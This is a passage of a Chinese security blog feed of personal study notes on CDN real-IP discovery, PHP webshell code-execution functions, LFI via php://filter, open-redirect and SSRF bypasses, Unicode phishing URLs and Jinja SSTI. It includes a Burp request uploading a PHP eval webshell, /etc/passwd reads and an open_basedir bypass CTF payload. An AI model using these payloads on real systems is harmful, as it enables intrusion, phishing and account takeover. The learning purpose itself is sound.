title="Zgrab探测"></a>Zgrab探测</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">安装golang</span><br><span class="line">安装zgrab https://github.com/zmap/zgrab/</span><br></pre></td></tr></table></figure><blockquote><p>详细可看：<a href="https://levyhsu.com/2017/05/%e5%88%a9%e7%94%a8zgrab%e7%bb%95cdn%e6%89%be%e7%9c%9f%e5%ae%9eip/" target="_blank" rel="noopener">https://levyhsu.com/2017/05/%e5%88%a9%e7%94%a8zgrab%e7%bb%95cdn%e6%89%be%e7%9c%9f%e5%ae%9eip/</a></p></blockquote><h1 id="查询Https证书"><a href="#查询Https证书" class="headerlink" title="查询Https证书"></a>查询Https证书</h1><p>fofa<br><code>cert=&quot;xxx.com&quot;</code></p><p><a href="https://censys.io/" target="_blank" rel="noopener">censys</a><br>查询所有包含此网站https证书的网站<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">443.https.tls.certificate.parsed.extensions.subject_alt_name.dns_names:www.xxx.com</span><br><span class="line">或者</span><br><span class="line">搜索parsed.names:xx.com</span><br><span class="line">选中右侧Explore &gt; What<span class="string">'s using this certificate? &gt; IPv4 Hosts</span></span><br></pre></td></tr></table></figure></p><h1 id="F5-LTM-负载均衡解码获取真实内网ip"><a href="#F5-LTM-负载均衡解码获取真实内网ip" class="headerlink" title="F5 LTM 负载均衡解码获取真实内网ip"></a>F5 LTM 负载均衡解码获取真实内网ip</h1><blockquote><p>详细:<a href="https://threathunter.org/topic/5940c85d9c58e020408a79fe" target="_blank" rel="noopener">https://threathunter.org/topic/5940c85d9c58e020408a79fe</a></p></blockquote><h1 id="漏洞获取ip"><a href="#漏洞获取ip" class="headerlink" title="漏洞获取ip"></a>漏洞获取ip</h1><p>waf没绕怎么用漏洞(死循环)<br>但ssrf,phpinfo()等不包含敏感参数的漏洞使用</p><h1 id="多地ping-nslookup"><a href="#多地ping-nslookup" class="headerlink" title="多地ping,nslookup"></a>多地ping,nslookup</h1><p>多用于查看网站是否设置cdn(查真实ip鸡肋,一般没用)<br><a href="http://ping.chinaz.com/" target="_blank" rel="noopener">多地ping</a></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup www.xx.com 8.8.8.8</span><br></pre></td></tr></table></figure><p>可尝试换国外小众dns解析</p><blockquote><p>参考自：<a href="https://zhuanlan.zhihu.com/p/33440472" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/33440472</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;个人学习汇总&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;host目录&lt;code&gt;C:\Windows\System32\drivers\etc&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&quot;DNS历史解析记录&quot;&gt;&lt;a href=&quot;#DNS历史解析记录&quot; c
      
    
    </summary>
    
    
    
      <category term="信息搜集" scheme="http://Vorders.me/tags/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>琐碎知识</title>
    <link href="http://vorders.me/2018/11/06/%E7%90%90%E7%A2%8E%E7%9F%A5%E8%AF%86/"/>
    <id>http://vorders.me/2018/11/06/%E7%90%90%E7%A2%8E%E7%9F%A5%E8%AF%86/</id>
    <published>2018-11-06T09:20:09.000Z</published>
    <updated>2019-08-27T02:22:31.694Z</updated>
    
    <content type="html"><![CDATA[<h1 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h1><h2 id="代码执行方法"><a href="#代码执行方法" class="headerlink" title="代码执行方法"></a>代码执行方法</h2><blockquote><p><a href="https://www.leavesongs.com/PENETRATION/unobfuscated-phpjiami.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/unobfuscated-phpjiami.html</a><br><a href="http://blog.evalbug.com/2017/09/21/phpdecode_01/" target="_blank" rel="noopener">http://blog.evalbug.com/2017/09/21/phpdecode_01/</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span></span><br><span class="line">preg_replace 函数中的 /e 修饰符 create_function</span><br><span class="line">assert</span><br><span class="line">call_user_func</span><br><span class="line">call_user_func_array</span><br><span class="line">usort</span><br><span class="line">uksort</span><br><span class="line">array_map</span><br><span class="line">array_walk</span><br><span class="line">array_filter</span><br><span class="line">$a($b) <span class="comment">// 动态组装代码执行</span></span><br><span class="line">unserialize <span class="comment">//反序列化导致代码执行</span></span><br></pre></td></tr></table></figure><h2 id="eval-hook检测"><a href="#eval-hook检测" class="headerlink" title="eval hook检测"></a>eval hook检测</h2><p>evalhook下载:<a href="http://php-security.org/downloads/evalhook-0.1.tar.gz" target="_blank" rel="noopener">download</a><br>配置指南：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">执行phpize（是一个shell脚本，编译PHP扩展的工具，主要是根据系统信息生成对应的configure文件,在evalhook目录下执行）</span><br><span class="line"></span><br><span class="line">./configure --with-php-config=/usr/local/php/bin/php-config(先查看自己php-config的目录)</span><br><span class="line"></span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">然后在php.int添加xx.so扩展（php -i | grep &apos;php.ini&apos;寻找）</span><br><span class="line"></span><br><span class="line">最后修改php.ini配置extension=xx.so</span><br><span class="line"></span><br><span class="line">使用方式：php -d extension=xx.so xx.php</span><br></pre></td></tr></table></figure></p><p>大批量解密推荐virink师傅的：<a href="https://github.com/virink/phpext_phpjiami_decode" target="_blank" rel="noopener">phpext_phpjiami_decode</a></p><blockquote><p><a href="http://php-security.org/2010/05/13/article-decoding-a-user-space-encoded-php-script/index.html" target="_blank" rel="noopener">http://php-security.org/2010/05/13/article-decoding-a-user-space-encoded-php-script/index.html</a></p></blockquote><hr><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">include.php?file=php://filter/string.strip_tags/resource=/etc/passwd</span><br><span class="line"><span class="comment">#包含自身include.php?file=php://filter/string.strip_tags/resource=include.php引起php7崩溃</span></span><br></pre></td></tr></table></figure><p>奔溃被保存在<code>/tmp/phpXXXXXX</code>(XXXXXX是数字+字母的6位数)<br>使用burpsuite上传<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST /bestphp/index.php?function=extract&amp;file=php://filter/string.strip_tags/resource=function.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 232</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: null</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">DNT: 1</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryeScXqSzdW2v22xyk</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span><br><span class="line">Cookie: PHPSESSID=vole2qfdpp1mb0ftiavjokte96</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryeScXqSzdW2v22xyk</span><br><span class="line">Content-Disposition: form-data; name=&quot;fileUpload&quot;; filename=&quot;test.jpg&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php echo &quot;flagflag&quot;;@eval($_POST[123]); ?&gt;</span><br><span class="line">------WebKitFormBoundaryeScXqSzdW2v22xyk--</span><br></pre></td></tr></table></figure></p><p>使用burpsuite爆破,勾选关键词<code>flag</code>检测<br><code>http://localhost:80/bestphp/index.php?function=extract&amp;file=/tmp/phpxxxxxx</code></p><blockquote><p>来自 <a href="https://www.jianshu.com/p/7d63eca80686" target="_blank" rel="noopener">https://www.jianshu.com/p/7d63eca80686</a></p></blockquote><hr><h1 id="重定向跳转"><a href="#重定向跳转" class="headerlink" title="重定向跳转"></a>重定向跳转</h1><h2 id="url语法结构"><a href="#url语法结构" class="headerlink" title="url语法结构"></a>url语法结构</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">URI         = scheme &quot;:&quot; hier-part [ &quot;?&quot; query ] [ &quot;#&quot; fragment ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> foo://example.com:8042/over/there?name=ferret#nose</span><br><span class="line"> \_/   \______________/\_________/ \_________/ \__/</span><br><span class="line">  |           |            |            |        |</span><br><span class="line">scheme     authority       path        query   fragment</span><br><span class="line">  |   _____________________|__</span><br><span class="line"> / \ /                        \</span><br><span class="line"> urn:example:animal:ferret:nose</span><br></pre></td></tr></table></figure><blockquote><p>具体看官网：<a href="https://tools.ietf.org/html/rfc3986#section-3" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc3986#section-3</a></p></blockquote><h2 id="误导向url跳转"><a href="#误导向url跳转" class="headerlink" title="误导向url跳转"></a>误导向url跳转</h2><p>用户可能认为访问的是google官网,实则访问baidu  例如:<br><code>http://google.com@baidu.com/</code><br><code>//0x7050f849:?.google.com</code></p><h3 id="1-混淆"><a href="#1-混淆" class="headerlink" title="1.混淆"></a>1.混淆</h3><p>变形为<strong>10/16/2进制的ip</strong>    例如:<code>http://google.com@0x7050F849/</code><br>将目标网址<strong>url编码</strong>       例如:<code>http://google.com@%62%61%69%64%75%2e%63%6f%6d</code></p><h3 id="2-其他操作"><a href="#2-其他操作" class="headerlink" title="2.其他操作"></a>2.其他操作</h3><p>针对ssrf和重定向绕过payload<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">//baidu.com</span><br><span class="line">///www.baidu.com//..</span><br><span class="line">.baidu.com</span><br><span class="line">http://baidu.com;google.com/</span><br><span class="line">0://baidu.com:80,google.com:80/</span><br><span class="line">http://baidu<span class="variable">$google</span>.com <span class="comment">#对于bash执行的ssrf来说相当于-&gt;0://baidu&lt;empty&gt;.com</span></span><br></pre></td></tr></table></figure></p><p>其中<code>//xx.com/</code>出现在django漏洞中-&gt;cve-2018-14574<br><code>xx@xx</code>则在官方<a href="https://tools.ietf.org/html/rfc3986#section-7.6" target="_blank" rel="noopener">rfc3986</a>有讲述到</p><h3 id="3-unicode不可见字符钓鱼"><a href="#3-unicode不可见字符钓鱼" class="headerlink" title="3.unicode不可见字符钓鱼"></a>3.unicode不可见字符钓鱼</h3><p>原本思考使用<code>@</code><a href="https://zh.wikipedia.org/wiki/ASCII" target="_blank" rel="noopener">wiki_ascii</a>的unicode可能达到跳转效果:<br>但当firefox下输入<code>google.com␀.com</code> 时<br>发现跳转到<code>http://google.xn--com-zx3a.com</code>这个域名<br>缩短域名<code>www.google␀.com</code>，跳转至<code>http://www.xn--google-165c.com</code></p><p>又想到反正<code>␀</code>为unicode,为何不直接寻找相似unicode去伪造网站<br><code>https://www.bаidu.com</code> 其中<code>а</code>为U+0430可以达到以假乱真的效果<code>但是qq上无法正确显示网址,而且firefox,chrome有针对其unicode进行转义,上述的xn--com-zx3a.com就是转换后的网址</code></p><blockquote><p>unicode大全:<a href="https://unicode-table.com/cn/" target="_blank" rel="noopener">https://unicode-table.com/cn/</a></p></blockquote><h3 id="4-针对unicode大小写转换后的攻击"><a href="#4-针对unicode大小写转换后的攻击" class="headerlink" title="4.针对unicode大小写转换后的攻击"></a>4.针对unicode大小写转换后的攻击</h3><p>当一个网站运行unicode字符作为用户名，他使用一个python库来判断用户名是否幂等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> twisted.words.protocols.jabber.xmpp_stringprep <span class="keyword">import</span> nodeprep</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">canonical_username</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> nodeprep.prepare(name)</span><br><span class="line">canonical_username(<span class="string">u'\u1d2e\u1d35\u1d33\u1d2e\u1d35\u1d3f\u1d30'</span>)</span><br></pre></td></tr></table></figure><p>这个函数会把大写转换为小写，把类似的unicode字符做一个与chrome的地址栏里相似的转换，举个例子<br>BIG会被转换为big, ƁƗƓ会被转换为ɓɨɠ<br>他们对用户名是否重复的判断是执行一次这个函数然后进行比对 ，例如AAA会被变为aaa则和之前已经注册过的aaa重复 ，但是这里出现了一个错误，注册一个ᴬᴬᴬ，经过函数处理后变成了AAA，因为与aaa不同所以注册成功，而在用户点击重置密码的连接的时候，这个函数再次被执行了一次，AAA变成了aaa，导致用户aaa的密码被越权修改</p><blockquote><p>来自:<a href="http://blog.lnyas.xyz/?p=1411" target="_blank" rel="noopener">http://blog.lnyas.xyz/?p=1411</a></p></blockquote><h3 id="5-域名分割"><a href="#5-域名分割" class="headerlink" title="5.域名分割"></a>5.域名分割</h3><p>访问：<code>http://baidu.c℆a.google.com</code><br>浏览器会将其分割为<code>http://baidu.cc/ua.google.com</code><br>实际测试，浏览器识别为搜索引擎搜索</p><blockquote><p>来自:<a href="https://xz.aliyun.com/t/6070" target="_blank" rel="noopener">https://xz.aliyun.com/t/6070</a></p></blockquote><h2 id="URL-Scheme-Attack"><a href="#URL-Scheme-Attack" class="headerlink" title="URL Scheme Attack"></a>URL Scheme Attack</h2><blockquote><p><a href="https://xz.aliyun.com/t/3233" target="_blank" rel="noopener">https://xz.aliyun.com/t/3233</a><br><a href="https://xz.aliyun.com/t/5402" target="_blank" rel="noopener">https://xz.aliyun.com/t/5402</a></p></blockquote><h1 id="mysql错误型注入"><a href="#mysql错误型注入" class="headerlink" title="mysql错误型注入"></a>mysql错误型注入</h1><p><strong> updatexml </strong> 和 <strong> extractvalue </strong> 详解</p><blockquote><p><a href="http://blkstone.github.io/2017/11/09/updatexml-sqli/" target="_blank" rel="noopener">http://blkstone.github.io/2017/11/09/updatexml-sqli/</a></p></blockquote><h1 id="php的一些特性"><a href="#php的一些特性" class="headerlink" title="php的一些特性"></a>php的一些特性</h1><p>当代码中存在<code>\$_REQUEST[&#39;user_id&#39;]</code> <strong>/?user.id</strong>传参去进行绕过,同样可以绕过的符号还有<code></code>、<code>.</code>、<code>[</code>、<code>+</code>、<code>_</code></p><blockquote><p>详见：<a href="https://shuimugan.com/bug/view?bug_no=64792" target="_blank" rel="noopener">https://shuimugan.com/bug/view?bug_no=64792</a></p></blockquote><p>全局空间：<code>&lt;?= namespace c;\eval(phpinfo());?&gt;</code><br>命名空间定义同名，程序调用时优先调用命名空间的同名函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=create_function($_GET[<span class="number">1</span>],<span class="number">1</span>);<span class="meta">?&gt;</span></span><br><span class="line">/?<span class="number">1</span>=)&#123;&#125;phpinfo();<span class="comment">//</span></span><br></pre></td></tr></table></figure><blockquote><p><a href="https://mochazz.github.io/2019/01/12/create_function%E5%87%BD%E6%95%B0%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0RCE/" target="_blank" rel="noopener">https://mochazz.github.io/2019/01/12/create_function%E5%87%BD%E6%95%B0%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0RCE/</a></p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Main points : </span><br><span class="line">- open_basedir is a INI_ALL directive, and is consequently manageable through ini_set() <span class="keyword">function</span>, but only to make the rule more strict (the new path is checked against open_basedir)</span><br><span class="line">- open_basedir can be stored as a non resolved relative path</span><br><span class="line"></span><br><span class="line">Solution :</span><br><span class="line">- Go into the <span class="string">'img'</span> dir with <span class="built_in">chdir</span>() <span class="keyword">function</span></span><br><span class="line">- Set the open_basedir restriction to <span class="string">'..'</span> with ini_set(). This will be accepted as it points to /var/www/html, <span class="built_in">which</span> is authorized against the current open_basedir restriction.</span><br><span class="line">- The value stored <span class="keyword">in</span> the open_basedir is not resolved; <span class="string">'..'</span> is stored as the new open_basedir restriction. You can <span class="built_in">chdir</span>(<span class="string">'..'</span>); multiple <span class="built_in">times</span> to go at the root folder.</span><br><span class="line">- You can now reset the open_basedir restriction to /, that completely cancels it.</span><br><span class="line">- ... and <span class="built_in">read</span> the flag!</span><br><span class="line"></span><br><span class="line">Final payload : </span><br><span class="line">http://91.121.31.50/phuck3/?<span class="built_in">eval</span>=<span class="built_in">chdir</span>(<span class="string">'img'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);<span class="built_in">echo</span>(file_get_contents(<span class="string">'flag'</span>));</span><br></pre></td></tr></table></figure><h1 id="计ctf中小坑。"><a href="#计ctf中小坑。" class="headerlink" title="计ctf中小坑。"></a>计ctf中小坑。</h1><p><strong>[!]</strong> content-type头 :<br><strong>[+]</strong> Content-Type: application/x-www-form-urlencoded<br>翻车好多次,看清楚请求类型重要！！！</p><h2 id="php常见函数bypass"><a href="#php常见函数bypass" class="headerlink" title="php常见函数bypass"></a>php常见函数bypass</h2><p><a href="https://www.php.net/manual/zh/migration70.php" target="_blank" rel="noopener">php5和7差异</a></p><p><strong>[Q]</strong> : 函数：<code>sprintf()</code><br><strong>[A]</strong> :  <code>%s</code>绕过</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;webshell&quot;&gt;&lt;a href=&quot;#webshell&quot; class=&quot;headerlink&quot; title=&quot;webshell&quot;&gt;&lt;/a&gt;webshell&lt;/h1&gt;&lt;h2 id=&quot;代码执行方法&quot;&gt;&lt;a href=&quot;#代码执行方法&quot; class=&quot;headerli
      
    
    </summary>
    
    
    
      <category term="知识积累" scheme="http://Vorders.me/tags/%E7%9F%A5%E8%AF%86%E7%A7%AF%E7%B4%AF/"/>
    
  </entry>
  
  <entry>
    <title>vul♂hub学习(二)</title>
    <link href="http://vorders.me/2018/10/16/vul%E2%99%82hub%E5%AD%A6%E4%B9%A0(%E4%BA%8C)/"/>
    <id>http://vorders.me/2018/10/16/vul%E2%99%82hub%E5%AD%A6%E4%B9%A0(%E4%BA%8C)/</id>
    <published>2018-10-16T03:20:09.000Z</published>
    <updated>2018-12-25T09:26:41.316Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>签到大法好！</strong>，本文只为巩固vulhub中学到的知识</p></blockquote><blockquote><p>Vulhub是一个面向大众的开源漏洞靶场，无需docker知识，简单执行两条命令即可编译、运行一个完整的漏洞靶场镜像。<br>github：<a href="https://github.com/vulhub/vulhub" target="_blank" rel="noopener">vulhub/vulhub</a></p></blockquote><p><em>历史传送</em>：<a href="https://zhuanlan.zhihu.com/p/44172909" target="_blank" rel="noopener">vul♂hub(一)</a></p><h1 id="discuz"><a href="#discuz" class="headerlink" title="discuz"></a>discuz</h1><h1 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h1><h2 id="jinja-ssti注入"><a href="#jinja-ssti注入" class="headerlink" title="jinja ssti注入"></a>jinja ssti注入</h2><blockquote><p>模板引擎：模板引擎就是一个按照一定的语法格式, 使用视图的参数进行替换的一个过程</p></blockquote><p>举个最简单的例子:<br>模板代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;&#123;&#123;aaa&#125;&#125;&lt;/h1&gt;</span><br></pre></td></tr></table></figure></p><p>视图代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&apos;/&apos;)</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&apos;index.html&apos;, aaa=&apos;hello&apos;)</span><br></pre></td></tr></table></figure></p><p>访问网页显示的代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;hello&lt;/h1&gt;</span><br></pre></td></tr></table></figure></p><blockquote><p>ssti:模板注入,相似与sql注入。主要未对用户输入参数进行判断直接执行渲染，导致可执行任意代码</p></blockquote><blockquote><p>详解推荐：<a href="https://xz.aliyun.com/t/3679" target="_blank" rel="noopener">https://xz.aliyun.com/t/3679</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;签到大法好！&lt;/strong&gt;，本文只为巩固vulhub中学到的知识&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Vulhub是一个面向大众的开源漏洞靶场，无需docker知识，简单执行两条命令即可编译、运行
      
    
    </summary>
    
    
    
      <category term="vulub" scheme="http://Vorders.me/tags/vulub/"/>
    
  </entry>
  
</feed>
